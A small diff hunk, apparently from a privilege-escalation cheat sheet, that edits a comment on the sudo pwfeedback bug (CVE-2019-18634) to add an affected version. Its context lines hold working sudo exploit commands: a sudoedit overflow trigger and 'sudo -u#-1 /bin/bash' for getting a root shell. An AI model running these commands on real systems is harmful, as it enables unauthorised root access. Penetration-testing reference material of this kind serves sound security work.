@@ -132,7 +132,7 @@ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
 # If: (ALL, !root) /bin/bash
 sudo -u#-1 /bin/bash
 
-# CVE-2019-18634 - Sudo pwfeedback
+# CVE-2019-18634 - Sudo < 1.8.26, pwfeedback enabled in /etc/sudoers
 # Exploitable if pwfeedback is enabled in /etc/sudoers
 ```
 
